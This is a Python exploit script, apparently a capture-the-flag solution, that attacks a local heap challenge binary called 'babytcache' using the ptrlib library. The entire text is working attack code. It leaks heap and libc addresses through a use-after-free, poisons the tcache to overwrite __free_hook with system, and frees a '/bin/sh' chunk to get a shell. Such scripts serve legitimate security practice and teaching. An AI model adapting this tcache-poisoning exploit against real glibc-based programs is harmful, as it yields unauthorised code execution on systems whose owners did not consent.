from ptrlib import *

def add(index, size, data):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(":\n", str(index))
    sock.sendlineafter(":\n", str(size))
    sock.sendafter(":\n", data)
    return

def edit(index, data):
    sock.sendlineafter(">> ", "2")
    sock.sendlineafter(":\n", str(index))
    sock.sendafter(":\n", data)
    return

def delete(index):
    sock.sendlineafter(">> ", "3")
    sock.sendlineafter(":\n", str(index))
    return

def show(index):
    sock.sendlineafter(">> ", "4")
    sock.sendlineafter(":\n", str(index))
    sock.recvuntil(":")
    return sock.recvline()

libc = ELF("./libc.so.6")
sock = Process("./babytcache")
libc_main_arena = 0x3ebc40

add(0, 0x1f8, "A")
add(1, 0x1f8, "B")
add(2, 0x1f8, "/bin/sh")
add(3, 0x88, (p64(0) + p64(0x21)) * 8)

# heap leak
delete(1)
delete(0)
addr_heap = u64(show(0))
logger.info("heap = " + hex(addr_heap))

# libc leak
edit(0, p64(addr_heap - 0x10))
add(4, 0x1f8, "A")
add(5, 0x1f8, p64(0) + p64(0x431))
delete(1)
libc_base = u64(show(1)) - 96 - libc_main_arena
logger.info("libc = " + hex(libc_base))

# tcache poisoning
delete(0)
edit(0, p64(libc_base + libc.symbol("__free_hook")))
add(6, 0x1f8, "dummy")
add(7, 0x1f8, p64(libc_base + libc.symbol("system")))

# get the shell!
delete(2)

sock.interactive()
